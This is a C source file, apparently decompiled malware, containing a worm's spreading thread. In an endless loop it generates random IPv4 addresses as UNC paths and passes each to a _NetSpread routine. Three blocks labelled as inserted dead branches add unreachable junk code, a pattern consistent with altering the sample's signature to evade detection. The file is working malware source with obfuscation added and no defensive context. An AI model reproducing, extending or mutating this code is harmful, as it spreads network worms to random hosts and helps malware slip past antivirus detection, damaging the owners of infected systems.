#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>   // added for sprintf
#include <string.h>
#include <stdbool.h>

DWORD WINAPI extra(LPVOID Data)
{
    DWORD tick_count;
    int rand_val1, rand_val2, rand_val3, rand_val4;
    char local_5c[64];
    LPCSTR param_1 = (LPCSTR)Data;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char comp_buf[64];
        DWORD comp_len = sizeof(comp_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetComputerNameA(comp_buf, &comp_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= comp_buf[0];
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(comp_buf, 0, sizeof(comp_buf));
        }
    }

    do {
        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
            char *tmp = (char *)malloc(64);
            if (tmp != NULL) {
                strcpy(tmp, "dummy");
                volatile DWORD len = strlen(tmp);
                volatile BYTE check = 0;
                for (volatile DWORD i = 0; i < len; i++) {
                    check ^= tmp[i];
                }
                volatile DWORD j = 0;
                while (j < 2) {
                    check += j;
                    j++;
                }
                char tmp2[32];
                memcpy(tmp2, tmp, 4);
                volatile DWORD val = (DWORD)tmp2[0] + check;
                val += len;
                free(tmp);
            }
        }

        tick_count = GetTickCount();
        srand(tick_count);
        memset(local_5c, 0, sizeof(local_5c));
        rand_val1 = rand() % 0x100;
        rand_val2 = rand() % 0x100;
        rand_val3 = rand() % 0x100;
        rand_val4 = rand() % 0x100;
        sprintf(local_5c, "\\\\%d.%d.%d.%d", rand_val4, rand_val3, rand_val2, rand_val1);
        _NetSpread((uint32_t)local_5c, param_1);

        // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
        volatile DWORD dummy_tick_3 = GetTickCount();
        if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
            volatile DWORD dummy_array[4];
            for (volatile DWORD i = 0; i < 4; i++) {
                dummy_array[i] = i * 0x811C9DC5;
            }
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 4; i++) {
                hash ^= dummy_array[i];
                hash = (hash << 5) - hash;
            }
            volatile DWORD extra_val = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                extra_val += (hash >> i) & 0xFF;
            }
            extra_val ^= dummy_array[3];
            memset(dummy_array, 0, sizeof(dummy_array));
        }
    } while (true);
}
